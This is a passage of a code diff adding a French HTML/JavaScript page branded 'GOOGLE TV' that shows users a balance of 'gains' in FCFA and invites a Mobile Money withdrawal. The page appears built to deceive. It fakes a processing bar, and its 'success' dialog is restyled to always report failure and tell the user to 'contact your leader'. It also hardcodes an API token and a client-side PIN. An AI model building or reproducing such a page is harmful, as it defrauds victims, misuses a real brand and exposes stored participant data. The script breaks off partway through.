@@ -1,0 +1,1124 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GOOGLE TV - Retirez vos sous en sécurité</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --indigo: #1E2A4A;
+    --indigo-deep: #10182C;
+    --indigo-soft: #2E3D63;
+    --gold: #C89A3E;
+    --gold-light: #E8C97A;
+    --bg: #FAF6EE;
+    --surface: #FFFFFF;
+    --text: #1B1B2F;
+    --muted: #6C7085;
+    --border: #E8E1D2;
+    --success: #2E7D5B;
+    --success-bg: #EAF6EF;
+    --danger: #C4453A;
+    --radius-lg: 22px;
+    --radius-md: 14px;
+    --radius-sm: 9px;
+    --shadow-soft: 0 10px 30px rgba(16, 24, 44, 0.08);
+    --shadow-card: 0 4px 16px rgba(16, 24, 44, 0.06);
+  }
+
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    font-family:'Inter', sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    -webkit-font-smoothing:antialiased;
+    min-height:100vh;
+  }
+  h1,h2,h3,.display{
+    font-family:'Space Grotesk', sans-serif;
+  }
+  button{font-family:inherit;cursor:pointer;}
+  input{font-family:inherit;}
+  .hidden{display:none !important;}
+  img,svg{display:block;}
+
+  /* ---------- Logo ---------- */
+  .logo{
+    font-family:'Space Grotesk', sans-serif;
+    font-weight:700;
+    font-size:1.5rem;
+    letter-spacing:-0.02em;
+    display:inline-flex;
+  }
+  .logo .my{color:var(--indigo);}
+  .logo .tont{color:var(--gold);}
+
+  /* ---------- Woven texture background (signature motif) ---------- */
+  .weave-bg{
+    background-color: var(--indigo-deep);
+    background-image:
+      repeating-linear-gradient(135deg, rgba(232,201,122,0.07) 0px, rgba(232,201,122,0.07) 2px, transparent 2px, transparent 26px),
+      repeating-linear-gradient(45deg, rgba(232,201,122,0.05) 0px, rgba(232,201,122,0.05) 2px, transparent 2px, transparent 26px),
+      radial-gradient(circle at 20% 20%, rgba(46,61,99,0.9), var(--indigo-deep) 60%);
+  }
+
+  /* ================= PIN SCREEN ================= */
+  #pinScreen{
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+  }
+  .pin-card{
+    background:var(--surface);
+    border-radius:var(--radius-lg);
+    box-shadow:var(--shadow-soft);
+    padding:40px 32px 32px;
+    width:100%;
+    max-width:380px;
+    text-align:center;
+    animation:riseIn .5s ease;
+  }
+  @keyframes riseIn{
+    from{opacity:0; transform:translateY(16px);}
+    to{opacity:1; transform:translateY(0);}
+  }
+  .pin-card .logo{justify-content:center; margin-bottom:6px; font-size:1.8rem;}
+  .pin-card .tagline{
+    color:var(--muted);
+    font-size:.85rem;
+    margin-bottom:28px;
+    letter-spacing:.02em;
+  }
+  .cowrie-row{
+    display:flex;
+    justify-content:center;
+    gap:10px;
+    margin-bottom:24px;
+    opacity:.8;
+  }
+  .cowrie-row svg{width:18px;height:18px;}
+
+  .pin-card label{
+    display:block;
+    font-size:.9rem;
+    font-weight:600;
+    margin-bottom:12px;
+    color:var(--text);
+  }
+  .pin-input-wrap{
+    position:relative;
+    margin-bottom:8px;
+  }
+  #pinInput{
+    width:100%;
+    padding:16px 44px 16px 18px;
+    font-size:1.4rem;
+    letter-spacing:.5em;
+    text-align:center;
+    border:2px solid var(--border);
+    border-radius:var(--radius-md);
+    outline:none;
+    transition:border-color .2s, box-shadow .2s;
+    background:var(--bg);
+    color:var(--text);
+  }
+  #pinInput:focus{
+    border-color:var(--gold);
+    box-shadow:0 0 0 4px rgba(200,154,62,0.15);
+  }
+  .pin-icon{
+    position:absolute;
+    right:14px;
+    top:50%;
+    transform:translateY(-50%);
+    color:var(--muted);
+  }
+  .error-msg{
+    color:var(--danger);
+    font-size:.85rem;
+    font-weight:500;
+    min-height:20px;
+    margin:8px 0 4px;
+    text-align:left;
+  }
+  .shake{animation:shake .4s;}
+  @keyframes shake{
+    10%,90%{transform:translateX(-2px);}
+    20%,80%{transform:translateX(4px);}
+    30%,50%,70%{transform:translateX(-8px);}
+    40%,60%{transform:translateX(8px);}
+  }
+  .btn-primary{
+    width:100%;
+    background:var(--indigo);
+    color:#fff;
+    border:none;
+    padding:15px;
+    border-radius:var(--radius-md);
+    font-size:1rem;
+    font-weight:600;
+    margin-top:14px;
+    transition:background .2s, transform .1s;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+  }
+  .btn-primary:hover{background:var(--indigo-soft);}
+  .btn-primary:active{transform:scale(.98);}
+  .btn-primary:disabled{opacity:.5; cursor:not-allowed;}
+  .pin-hint{
+    margin-top:20px;
+    font-size:.75rem;
+    color:var(--muted);
+  }
+
+  /* ================= DETAIL SCREEN ================= */
+  #detailScreen{min-height:100vh; display:flex; flex-direction:column;}
+  header.app-header{
+    background:var(--surface);
+    border-bottom:1px solid var(--border);
+    padding:16px 24px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    position:sticky;
+    top:0;
+    z-index:10;
+  }
+  .header-right{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-size:.85rem;
+    color:var(--muted);
+  }
+  .btn-logout{
+    background:none;
+    border:1px solid var(--border);
+    color:var(--muted);
+    padding:8px 14px;
+    border-radius:var(--radius-sm);
+    font-size:.8rem;
+    font-weight:600;
+    display:flex;
+    align-items:center;
+    gap:6px;
+    transition:.2s;
+  }
+  .btn-logout:hover{border-color:var(--indigo); color:var(--indigo);}
+
+  main{
+    flex:1;
+    width:100%;
+    max-width:920px;
+    margin:0 auto;
+    padding:32px 20px 60px;
+  }
+
+  /* ---- Hero identity card ---- */
+  .hero-card{
+    background:linear-gradient(135deg, var(--indigo) 0%, var(--indigo-deep) 100%);
+    border-radius:var(--radius-lg);
+    padding:36px;
+    color:#fff;
+    position:relative;
+    overflow:hidden;
+    box-shadow:var(--shadow-soft);
+  }
+  .hero-card::after{
+    content:"";
+    position:absolute;
+    right:-60px; top:-60px;
+    width:220px; height:220px;
+    border-radius:50%;
+    background:radial-gradient(circle, rgba(232,201,122,0.18), transparent 70%);
+  }
+  .hero-top{
+    display:flex;
+    align-items:center;
+    gap:18px;
+    margin-bottom:28px;
+    position:relative;
+    z-index:1;
+  }
+  .avatar{
+    width:64px; height:64px;
+    border-radius:50%;
+    background:var(--gold);
+    color:var(--indigo-deep);
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Space Grotesk', sans-serif;
+    font-weight:700;
+    font-size:1.4rem;
+    flex-shrink:0;
+  }
+  .hero-id{
+    font-size:.8rem;
+    color:var(--gold-light);
+    text-transform:uppercase;
+    letter-spacing:.08em;
+    margin-bottom:4px;
+    font-weight:600;
+  }
+  .hero-name{
+    font-size:1.5rem;
+    font-weight:600;
+  }
+  .hero-solde-row{
+    position:relative; z-index:1;
+    display:flex;
+    align-items:flex-end;
+    justify-content:space-between;
+    flex-wrap:wrap;
+    gap:16px;
+    border-top:1px solid rgba(255,255,255,0.12);
+    padding-top:22px;
+  }
+  .hero-solde-label{
+    font-size:.8rem;
+    color:rgba(255,255,255,0.6);
+    margin-bottom:6px;
+  }
+  .hero-solde-amount{
+    font-size:2.4rem;
+    font-weight:700;
+    font-family:'Space Grotesk', sans-serif;
+    color:var(--gold-light);
+    line-height:1;
+  }
+  .hero-solde-amount span{font-size:1.1rem; font-weight:600; margin-left:6px; color:rgba(255,255,255,.7);}
+  .hero-badge{
+    background:rgba(255,255,255,0.1);
+    border:1px solid rgba(255,255,255,0.18);
+    padding:8px 14px;
+    border-radius:100px;
+    font-size:.78rem;
+    display:flex;
+    align-items:center;
+    gap:6px;
+    color:#fff;
+  }
+
+  /* ---- cowrie divider ---- */
+  .divider{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    margin:36px 0 28px;
+  }
+  .divider .line{flex:1; height:1px; background:var(--border);}
+  .divider .cowries{display:flex; gap:8px; color:var(--gold);}
+  .divider svg{width:14px; height:14px;}
+
+  /* ---- About section ---- */
+  .section-title{
+    font-size:1.3rem;
+    font-weight:600;
+    margin-bottom:4px;
+  }
+  .section-sub{
+    color:var(--muted);
+    font-size:.92rem;
+    margin-bottom:22px;
+    line-height:1.5;
+  }
+  .info-grid{
+    display:grid;
+    grid-template-columns:repeat(3, 1fr);
+    gap:16px;
+    margin-bottom:8px;
+  }
+  .info-card{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:var(--radius-md);
+    padding:20px;
+    box-shadow:var(--shadow-card);
+  }
+  .info-icon{
+    width:38px; height:38px;
+    border-radius:10px;
+    background:#F3EBD8;
+    color:var(--gold);
+    display:flex; align-items:center; justify-content:center;
+    margin-bottom:14px;
+  }
+  .info-icon svg{width:20px; height:20px;}
+  .info-card h3{
+    font-size:1rem;
+    margin:0 0 8px;
+  }
+  .info-card p{
+    font-size:.87rem;
+    color:var(--muted);
+    line-height:1.55;
+    margin:0;
+  }
+
+  /* ---- Withdraw section ---- */
+  .withdraw-section{
+    margin-top:44px;
+  }
+  .methods-grid{
+    display:grid;
+    grid-template-columns:repeat(3, 1fr);
+    gap:14px;
+    margin-bottom:24px;
+  }
+  .method-card{
+    background:var(--surface);
+    border:2px solid var(--border);
+    border-radius:var(--radius-md);
+    padding:18px 12px;
+    text-align:center;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:10px;
+    transition:border-color .18s, transform .12s, box-shadow .18s;
+  }
+  .method-card:hover{transform:translateY(-2px); box-shadow:var(--shadow-card);}
+  .method-card.selected{
+    border-color:var(--gold);
+    background:#FDF9EF;
+    box-shadow:0 0 0 3px rgba(200,154,62,0.15);
+  }
+  .method-logo{
+    width:46px; height:46px;
+    border-radius:50%;
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Space Grotesk', sans-serif;
+    font-weight:700;
+    font-size:1rem;
+    color:#fff;
+  }
+  .method-card span{font-size:.82rem; font-weight:600; color:var(--text);}
+  .method-check{
+    position:absolute;
+    display:none;
+  }
+
+  .summary-panel{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:var(--radius-md);
+    padding:22px;
+    margin-bottom:20px;
+    display:none;
+  }
+  .summary-panel.show{display:block; animation:riseIn .35s ease;}
+  .summary-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:10px 0;
+    font-size:.92rem;
+  }
+  .summary-row + .summary-row{border-top:1px dashed var(--border);}
+  .summary-row .label{color:var(--muted);}
+  .summary-row .value{font-weight:600;}
+  .summary-row .value.gold{color:var(--gold); font-family:'Space Grotesk', sans-serif; font-size:1.1rem;}
+
+  .phone-field label{
+    display:block;
+    font-size:.85rem;
+    font-weight:600;
+    color:var(--text);
+    margin-bottom:10px;
+  }
+  .phone-field label span{color:var(--gold); font-weight:700;}
+  .phone-input-wrap{
+    display:flex;
+    align-items:stretch;
+    border:2px solid var(--border);
+    border-radius:var(--radius-md);
+    overflow:hidden;
+    transition:border-color .2s, box-shadow .2s;
+  }
+  .phone-input-wrap:focus-within{
+    border-color:var(--gold);
+    box-shadow:0 0 0 4px rgba(200,154,62,0.15);
+  }
+  .phone-prefix{
+    display:flex;
+    align-items:center;
+    padding:0 10px 0 14px;
+    background:var(--bg);
+    color:var(--text);
+    font-weight:600;
+    font-size:.9rem;
+    border-right:1px solid var(--border);
+    border-top:none;
+    border-bottom:none;
+    border-left:none;
+    outline:none;
+    cursor:pointer;
+    max-width:110px;
+    -webkit-appearance:none;
+    -moz-appearance:none;
+    appearance:none;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%236C7085' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");
+    background-repeat:no-repeat;
+    background-position:right 8px center;
+    background-size:14px;
+    padding-right:26px;
+  }
+  #phoneInput{
+    flex:1;
+    border:none;
+    outline:none;
+    padding:14px 16px;
+    font-size:1rem;
+    background:var(--surface);
+    color:var(--text);
+    letter-spacing:.03em;
+  }
+  .phone-error{
+    color:var(--danger);
+    font-size:.8rem;
+    font-weight:500;
+    min-height:18px;
+    margin-top:6px;
+  }
+  .summary-divider{
+    height:1px;
+    background:var(--border);
+    margin:18px 0 4px;
+  }
+
+  .btn-withdraw{
+    width:100%;
+    background:var(--gold);
+    color:var(--indigo-deep);
+    border:none;
+    padding:16px;
+    border-radius:var(--radius-md);
+    font-size:1rem;
+    font-weight:700;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    transition:background .2s, transform .1s;
+  }
+  .btn-withdraw:hover:not(:disabled){background:var(--gold-light);}
+  .btn-withdraw:active:not(:disabled){transform:scale(.98);}
+  .btn-withdraw:disabled{
+    background:#E7E1D0;
+    color:#A8A290;
+    cursor:not-allowed;
+  }
+
+  footer{
+    text-align:center;
+    padding:22px;
+    font-size:.78rem;
+    color:var(--muted);
+  }
+
+  /* ================= MODALS ================= */
+  .modal-overlay{
+    position:fixed; inset:0;
+    background:rgba(16,24,44,0.55);
+    display:flex; align-items:center; justify-content:center;
+    padding:20px;
+    z-index:100;
+    animation:fadeIn .2s ease;
+  }
+  @keyframes fadeIn{from{opacity:0;} to{opacity:1;}}
+  .modal-card{
+    background:var(--surface);
+    border-radius:var(--radius-lg);
+    padding:36px 30px;
+    width:100%;
+    max-width:380px;
+    text-align:center;
+    animation:riseIn .3s ease;
+  }
+  .progress-icon{
+    width:56px; height:56px;
+    margin:0 auto 20px;
+    border-radius:50%;
+    background:#F3EBD8;
+    display:flex; align-items:center; justify-content:center;
+    color:var(--gold);
+  }
+  .progress-icon svg{
+    width:28px; height:28px;
+    animation:spin 1.4s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .modal-card h3{margin:0 0 6px; font-size:1.15rem;}
+  .modal-card p.sub{color:var(--muted); font-size:.87rem; margin:0 0 22px;}
+  .progress-bar-track{
+    width:100%;
+    height:10px;
+    background:var(--border);
+    border-radius:100px;
+    overflow:hidden;
+    margin-bottom:10px;
+  }
+  .progress-bar-fill{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg, var(--gold), var(--indigo));
+    border-radius:100px;
+    transition:width .35s ease;
+  }
+  .progress-percent{
+    font-family:'Space Grotesk', sans-serif;
+    font-weight:700;
+    color:var(--indigo);
+    font-size:.95rem;
+  }
+
+  .success-icon{
+    width:72px; height:72px;
+    margin:0 auto 18px;
+    border-radius:50%;
+    background:var(--success-bg);
+    display:flex; align-items:center; justify-content:center;
+    color:var(--success);
+  }
+  .success-icon svg{width:36px; height:36px;}
+  .modal-card.success-card h3{color:var(--success);}
+  .success-detail{
+    background:var(--bg);
+    border-radius:var(--radius-sm);
+    padding:14px 16px;
+    margin:18px 0 24px;
+    font-size:.85rem;
+    color:var(--text);
+    text-align:left;
+  }
+  .success-detail .row{display:flex; justify-content:space-between; padding:4px 0;}
+  .success-detail .row .label{color:var(--muted);}
+  .btn-home{
+    width:100%;
+    background:var(--success);
+    color:#fff;
+    border:none;
+    padding:14px;
+    border-radius:var(--radius-md);
+    font-size:.95rem;
+    font-weight:600;
+    display:flex; align-items:center; justify-content:center; gap:8px;
+  }
+  .btn-home:hover{opacity:.92;}
+
+  /* ================= RESPONSIVE ================= */
+  @media (max-width: 720px){
+    .info-grid{grid-template-columns:1fr;}
+    .methods-grid{grid-template-columns:repeat(3, 1fr); gap:10px;}
+    .hero-solde-amount{font-size:1.9rem;}
+    main{padding:24px 16px 50px;}
+    .hero-card{padding:26px 20px;}
+  }
+  @media (max-width: 420px){
+    .methods-grid{grid-template-columns:repeat(2, 1fr);}
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    *{animation-duration:.001s !important; transition-duration:.001s !important;}
+  }
+
+  :focus-visible{
+    outline:3px solid var(--gold);
+    outline-offset:2px;
+  }
+</style>
+</head>
+<body>
+
+<!-- ================= ECRAN 1 : CODE PIN ================= -->
+<div id="pinScreen" class="weave-bg">
+  <div class="pin-card">
+    <div class="logo"><span class="my">GOOGLE</span><span class="tont">TV</span></div>
+    <div class="tagline">Retirez vos gains en toute sécutité</div>
+
+    <div class="cowrie-row" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M4 12c0-5 4-8 8-8s8 3 8 8-4 8-8 8-8-3-8-8Z" stroke="currentColor" stroke-width="1.6"/><path d="M9 12h6" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
+      <svg viewBox="0 0 24 24" fill="none"><path d="M4 12c0-5 4-8 8-8s8 3 8 8-4 8-8 8-8-3-8-8Z" stroke="currentColor" stroke-width="1.6"/><path d="M9 12h6" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
+      <svg viewBox="0 0 24 24" fill="none"><path d="M4 12c0-5 4-8 8-8s8 3 8 8-4 8-8 8-8-3-8-8Z" stroke="currentColor" stroke-width="1.6"/><path d="M9 12h6" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
+    </div>
+
+    <form id="pinForm" novalidate>
+      <label for="pinInput">Veuillez entrer votre code PIN</label>
+      <div class="pin-input-wrap">
+        <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="6" id="pinInput" placeholder="••••••" autocomplete="off">
+        <span class="pin-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="5" y="10" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.6"/><path d="M8 10V7a4 4 0 0 1 8 0v3" stroke="currentColor" stroke-width="1.6"/></svg>
+        </span>
+      </div>
+      <div class="error-msg" id="pinError"></div>
+      <button type="submit" class="btn-primary">
+        Valider
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+    </form>
+    <div class="pin-hint">Code fourni par votre leader</div>
+  </div>
+</div>
+
+<!-- ================= ECRAN 2 : DETAIL PARTICIPANT ================= -->
+<div id="detailScreen" class="hidden">
+  <header class="app-header">
+    <div class="logo"><span class="my">GOOGLE</span><span class="tont">TV</span></div>
+    <div class="header-right">
+      <span id="headerName">—</span>
+      <button class="btn-logout" id="logoutBtn" title="Se déconnecter">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Quitter
+      </button>
+    </div>
+  </header>
+
+  <main>
+    <!-- Bloc identité + solde -->
+    <section class="hero-card">
+      <div class="hero-top">
+        <div class="avatar" id="avatarInitials">--</div>
+        <div>
+          <div class="hero-id">ID · <span id="heroId">-</span></div>
+          <div class="hero-name" id="heroName">Client</div>
+        </div>
+      </div>
+      <div class="hero-solde-row">
+        <div>
+          <div class="hero-solde-label">Vues</div>
+          <div class="hero-solde-amount" id="heroVues">0</div>
+        </div>
+        <div>
+          <div class="hero-solde-label">Solde total</div>
+          <div class="hero-solde-amount" id="heroSolde">0<span>FCFA</span></div>
+        </div>
+        <div class="hero-badge">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M12 2 4 6v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V6l-8-4Z" stroke="currentColor" stroke-width="1.6"/></svg>
+          Compte vérifié
+        </div>
+      </div>
+    </section>
+
+    <div class="divider" aria-hidden="true">
+      <div class="line"></div>
+      <div class="cowries">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M4 12c0-5 4-8 8-8s8 3 8 8-4 8-8 8-8-3-8-8Z" stroke="currentColor" stroke-width="1.8"/><path d="M9 12h6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+        <svg viewBox="0 0 24 24" fill="none"><path d="M4 12c0-5 4-8 8-8s8 3 8 8-4 8-8 8-8-3-8-8Z" stroke="currentColor" stroke-width="1.8"/><path d="M9 12h6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+        <svg viewBox="0 0 24 24" fill="none"><path d="M4 12c0-5 4-8 8-8s8 3 8 8-4 8-8 8-8-3-8-8Z" stroke="currentColor" stroke-width="1.8"/><path d="M9 12h6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+      </div>
+      <div class="line"></div>
+    </div>
+
+    <!-- Bloc pédagogique tontine digitale -->
+    <section>
+
+      
+
+      <div class="info-grid">
+        <div class="info-card">
+          <div class="info-icon">
+            <svg viewBox="0 0 24 24" fill="none"><rect x="4" y="10" width="16" height="10" rx="2" stroke="currentColor" stroke-width="1.7"/><path d="M8 10V7a4 4 0 0 1 8 0v3" stroke="currentColor" stroke-width="1.7"/></svg>
+          </div>
+          <h3>Sécurité renforcée</h3>
+          <p>Chaque accès est protégé par un code PIN personnel. Votre argent est suivi en temps réel, à l'abri des erreurs de calcul. Nous vous remboursons votre argent</p>
+        </div>
+        <div class="info-card">
+          <div class="info-icon">
+            <svg viewBox="0 0 24 24" fill="none"><path d="M3 12h4l3 8 4-16 3 8h4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </div>
+          <h3>Transparence totale</h3>
+          <p>Consultez à tout moment le montant de votre solde. Chaque client voit le solde qui lui sera reversé en temps réel.</p>
+        </div>
+        <div class="info-card">
+          <div class="info-icon">
+            <svg viewBox="0 0 24 24" fill="none"><rect x="5" y="3" width="14" height="18" rx="2" stroke="currentColor" stroke-width="1.7"/><path d="M9 7h6M9 11h6M9 15h3" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/></svg>
+          </div>
+          <h3>Retraits accessibles</h3>
+          <p>Plus besoin de vous déplacer : retirez vos fonds directement vers votre moyen de paiement mobile préféré, en quelques instants.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Bloc retrait -->
+    <section class="withdraw-section">
+      <div class="section-title">Retirer mes fonds</div>
+      <div class="section-sub">Choisissez le moyen de paiement sur lequel vous souhaitez recevoir votre solde.</div>
+
+      <div class="methods-grid" id="methodsGrid">
+        <!-- généré en JS -->
+      </div>
+
+      <div class="summary-panel" id="summaryPanel">
+        <div class="phone-field">
+          <label for="phoneInput">Numéro de téléphone Mobile Money (<span id="phoneMethodLabel">-</span>)</label>
+          <div class="phone-input-wrap">
+            <select class="phone-prefix" id="countryCode">
+              <option value="+229" selected>🇧🇯 +229</option>
+              <option value="+228">🇹🇬 +228</option>
+              <option value="+225">🇨🇮 +225</option>
+              <option value="+221">🇸🇳 +221</option>
+              <option value="+223">🇲🇱 +223</option>
+              <option value="+226">🇧🇫 +226</option>
+              <option value="+227">🇳🇪 +227</option>
+              <option value="+233">🇬🇭 +233</option>
+              <option value="+234">🇳🇬 +234</option>
+              <option value="+237">🇨🇲 +237</option>
+              <option value="+235">🇹🇩 +235</option>
+              <option value="+236">🇨🇫 +236</option>
+              <option value="+241">🇬🇦 +241</option>
+              <option value="+242">🇨🇬 +242</option>
+              <option value="+243">🇨🇩 +243</option>
+              <option value="+224">🇬🇳 +224</option>
+              <option value="+245">🇬🇼 +245</option>
+              <option value="+220">🇬🇲 +220</option>
+              <option value="+232">🇸🇱 +232</option>
+              <option value="+231">🇱🇷 +231</option>
+              <option value="+254">🇰🇪 +254</option>
+              <option value="+255">🇹🇿 +255</option>
+              <option value="+256">🇺🇬 +256</option>
+              <option value="+250">🇷🇼 +250</option>
+              <option value="+27">🇿🇦 +27</option>
+              <option value="+212">🇲🇦 +212</option>
+              <option value="+216">🇹🇳 +216</option>
+              <option value="+213">🇩🇿 +213</option>
+              <option value="+20">🇪🇬 +20</option>
+            </select>
+            <input type="tel" id="phoneInput" placeholder="01 23 45 67 89" inputmode="numeric" maxlength="16" autocomplete="off">
+          </div>
+          <div class="phone-error" id="phoneError"></div>
+        </div>
+
+        <div class="summary-divider"></div>
+
+        <div class="summary-row">
+          <span class="label">Bénéficiaire</span>
+          <span class="value" id="summaryName">-</span>
+        </div>
+        <div class="summary-row">
+          <span class="label">Moyen de paiement</span>
+          <span class="value" id="summaryMethod">-</span>
+        </div>
+        <div class="summary-row">
+          <span class="label">Numéro de réception</span>
+          <span class="value" id="summaryPhone">-</span>
+        </div>
+        <div class="summary-row">
+          <span class="label">Montant à retirer</span>
+          <span class="value gold" id="summaryAmount">0 FCFA</span>
+        </div>
+      </div>
+
+      <button class="btn-withdraw" id="withdrawBtn" disabled>
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="M12 3v12m0 0 4-4m-4 4-4-4M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Sélectionnez un moyen de paiement
+      </button>
+    </section>
+  </main>
+
+  <footer>GOOGLE TV — Retirez vos fonds en toute sécurité</footer>
+</div>
+
+<!-- ================= MODAL : TRAITEMENT ================= -->
+<div id="progressModal" class="modal-overlay hidden">
+  <div class="modal-card">
+    <div class="progress-icon">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M21 12a9 9 0 1 1-3-6.7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg>
+    </div>
+    <h3>Traitement de votre retrait</h3>
+    <p class="sub">Veuillez patienter, ne fermez pas cette page.</p>
+    <div class="progress-bar-track">
+      <div class="progress-bar-fill" id="progressFill"></div>
+    </div>
+    <div class="progress-percent"><span id="progressPercent">0</span>%</div>
+  </div>
+</div>
+
+
+
+
+
+<!-- ================= MODAL  (variante visuelle "échec") ================= -->
+<div id="successModal" class="modal-overlay hidden">
+  <div class="modal-card success-card">
+    <div class="success-icon" style="background:#FBEAE8; color:#C4453A;">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M18 6 6 18M6 6l12 12" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <h3 style="color:#C4453A;">Transaction non effectuée !</h3>
+    <p class="sub">Veuillez contacter votre leader pour finaliser votre retrait</p>
+    <div class="success-detail">
+      <div class="row"><span class="label">Montant retiré</span><span id="successAmount">0 FCFA</span></div>
+      <div class="row"><span class="label">Vers</span><span id="successMethod">-</span></div>
+      <div class="row"><span class="label">Numéro</span><span id="successPhone">-</span></div>
+    </div>
+    <a href="#" id="homeBtn" class="btn-home" style="background:#C4453A; text-decoration:none;">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M18 6 6 18M6 6l12 12" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Accueil
+    </a>
+  </div>
+</div>
+
+<script>
+(function(){
+  // ---------- Paramètres via query string + API NocoDB ----------
+  const params = new URLSearchParams(window.location.search);
+  const participantId = params.get('id');
+
+  const participant = {
+    id: participantId || '-',
+    nom: 'Client',
+    solde: 0,
+    vues: 0
+  };
+
+  const API_URL = participantId
+    ? `https://app.nocodb.com/api/v3/data/pqrd6t2vdvhylip/ma68x7libu3ljvb/records/${encodeURIComponent(participantId)}`
+    : null;
+
+  const API_TOKEN = 'nc_pat_YT3HxYY1dCRGp9OKD2UGywZgcZ1tKeBYkP6y13zE';
+
+  const fmtMontant = (n) => n.toLocaleString('fr-FR');
+
+  function initials(nom){
+    const parts = nom.trim().split(/\s+/).filter(Boolean);
+    if(parts.length === 0) return '--';
+    if(parts.length === 1) return parts[0].substring(0,2).toUpperCase();
+    return (parts[0][0] + parts[1][0]).toUpperCase();
+  }
+
+  function populateParticipant(){
+    document.getElementById('heroId').textContent = participant.id;
+    document.getElementById('heroVues').textContent = fmtMontant(participant.vues);
+    document.getElementById('heroName').textContent = participant.nom;
+    document.getElementById('heroSolde').innerHTML = fmtMontant(participant.solde) + '<span>FCFA</span>';
+    document.getElementById('avatarInitials').textContent = initials(participant.nom);
+    document.getElementById('headerName').textContent = 'Bonjour, ' + participant.nom.split(' ')[0];
+    document.getElementById('summaryName').textContent = participant.nom;
+    document.getElementById('summaryAmount').textContent = fmtMontant(participant.solde) + ' FCFA';
+  }
+
+  async function loadParticipant(){
+    if(!participantId){
+      document.getElementById('heroName').textContent = 'ID manquant';
+      document.getElementById('headerName').textContent = 'ID manquant';
+      return;
+    }
+
+    try {
+      const response = await fetch(API_URL, {
+        method: 'GET',
+        headers: { 'xc-token': API_TOKEN }
+      });
+
+      if(!response.ok) throw new Error(`Erreur API HTTP ${response.status}`);
+
+      const data = await response.json();
+      const fields = data.fields || {};
+
+      participant.id = data.id ?? participantId;
+      participant.nom = fields.nom || 'Client';
+      participant.vues = Number(fields.vue) || 0;
+      participant.solde = Number(fields.montant) || 0;
+
+      populateParticipant();
+    } catch(error) {
+      console.error('Impossible de récupérer les données du participant :', error);
+      document.getElementById('heroName').textContent = 'Données indisponibles';
+      document.getElementById('headerName').textContent = 'Données indisponibles';
+    }
+  }
+
+  // ---------- Ecran PIN ----------
+  const CORRECT_PIN = "147258";
+  const pinForm = document.getElementById('pinForm');
+  const pinInput = document.getElementById('pinInput');
+  const pinError = document.getElementById('pinError');
+  const pinCard = document.querySelector('.pin-card');
+
+  pinInput.addEventListener('input', () => {
+    pinInput.value = pinInput.value.replace(/\D/g, '');
+  });
+
+  pinForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    if(pinInput.value === CORRECT_PIN){
+      document.getElementById('pinScreen').classList.add('hidden');
+      document.getElementById('detailScreen').classList.remove('hidden');
+    } else {
+      pinError.textContent = 'Code PIN incorrect. Veuillez réessayer.';
